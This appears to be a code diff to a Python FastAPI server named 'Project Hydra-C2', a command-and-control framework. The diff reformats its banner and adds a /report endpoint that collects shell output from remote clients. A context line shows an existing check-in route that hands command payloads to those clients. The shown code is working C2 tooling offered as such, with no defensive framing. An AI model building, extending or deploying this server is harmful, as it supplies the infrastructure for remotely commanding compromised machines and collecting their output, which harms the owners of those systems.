@@ -6,19 +6,18 @@ import uvicorn
 import json
 
 def print_banner():
-    # Added 'r' before quotes to fix SyntaxWarning
     banner = r"""
-   _    _           _              _____ ___  
-  | |  | |         | |            / ____|__ \ 
-  | |__| |_   _  __| |_ __ __ _  | |       ) |
-  |  __  | | | |/ _` | '__/ _` | | |      / / 
-  | |  | | |_| | (_| | | | (_| | | |____ / /_ 
-  |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
-           __/ |                              
-          |___/                               
+    _    _           _              _____ ___  
+   | |  | |         | |            / ____|__ \ 
+   | |__| |_   _  __| |_ __ __ _  | |       ) |
+   |  __  | | | |/ _` | '__/ _` | | |      / / 
+   | |  | | |_| | (_| | | | (_| | | |____ / /_ 
+   |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
+            __/ |                              
+           |___/                               
 
-  >> Project Hydra-C2: Multi-headed Framework
-  >> Status: Online | SSL: Enabled
+    >> Project Hydra-C2: Multi-headed Framework
+    >> Status: Online | SSL: Enabled
     """
     print(banner)
 
@@ -62,12 +61,24 @@ async def checkin(client_id: str, platform: str, request: Request):
         "command": command_payload
     }
 
+@app.post("/report/{client_id}")
+async def report_output(client_id: str, request: Request):
+    data = await request.json()
+    output = data.get("output", "No output")
+    
+    print(f"\n[+] SHELL_OUTPUT FROM {client_id}:")
+    print("-" * 40)
+    print(output.strip())
+    print("-" * 40 + "\n")
+    
+    return {"status": "received"}
+
 if __name__ == "__main__":
     uvicorn.run(
-        "main:app", # Recommended format for uvicorn
+        "main:app",
         host="0.0.0.0", 
         port=8443, 
         ssl_keyfile="key.pem", 
         ssl_certfile="cert.pem",
-        reload=True # Good for development
+        reload=True
     )
